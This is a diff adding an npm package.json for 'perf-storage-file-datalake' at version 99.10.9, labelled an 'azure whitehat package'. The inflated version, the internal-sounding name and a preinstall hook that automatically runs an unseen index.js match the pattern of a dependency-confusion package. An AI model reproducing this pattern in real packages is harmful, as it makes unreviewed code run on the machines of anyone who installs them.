@@ -1,0 +1,39 @@
+{
+    "name": "perf-storage-file-datalake",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-storage-file-datalake@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-w2CB1p0Cup5CPzJdpZ23lBdRl3b/CPVeS/dO4sXgJ5CoxHDkJo1USskl0oKRq5McONru4iC0jY2dCzwvdhiEAA==",
+        "shasum": "8ad97f60bfdcbc00ec0e2770d9c0641d5fa9f0ba",
+        "tarball": "https://registry.npmjs.org/perf-storage-file-datalake/-/perf-storage-file-datalake-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3590,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhon9oCRA9TVsSAnZWagAAMdwP/RwoKYBZQ0t5iqFcE0cF\nj9s4oOdSQWRPNKkBHYvFWRvbb6puqAf+7YcSCK6mcbMT64WNtuoFTnTPfVGU\nDO1/cOZNnJdf5zPzms4CHzJ6O/ZzM6xbvZprgkzts/bq5a6UtpFHt5Ch1qkg\n0xCBnYTsZbAPqTzKys8H3UUwv3+BP1jGFnXZmnXx9upH9uJ4dwzfC2IeaemY\nhG2MkwVPC6U1Z1rmOyy4PoI/hIQ369bXc+1dX+Ak4q+EmP550I3KKsXoDTCT\nuRUnPv/hum92GtNNrq7eKDKxorLb7K6MgrJMbIEF2V1G5xUvN+aresVQPVxq\npuu2sACBz6913v3AR3NXPlC52a5kPLx3tNORUnUpBzIxP19VeyaObN5HNG5R\nN8iTlF8yoUZxApq+lJcnnLQkKShRvNnJmCIDBQp5pTIC4zespVMgTiVedZHd\nCcY1RhH6yfTwjmuPEkrvmDO7JGEkqN8s0+YVfn0gEzICogQU4zWM4pJ/ZTlY\ntDQsJoZm9CX9UBL1lsZulfwdvbEEnpDwjUc2G8bU8+JauV8+cuR0EU5jR7Jw\npPpdmkFYI9wTRVHHKTC53I43fiDbhRT+CNsJNDq8c/9T2On7o0B59VZpC9sn\nt/Gr3xGKt2L3MR7R7RNzR8/GECCST6xvDXQlg6mBfOMtZ4hSAFXny08feCsM\nIMiZ\r\n=OIvW\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-storage-file-datalake_99.10.9_1638039399827_0.804859116366776"
+    },
+    "_hasShrinkwrap": false
+}
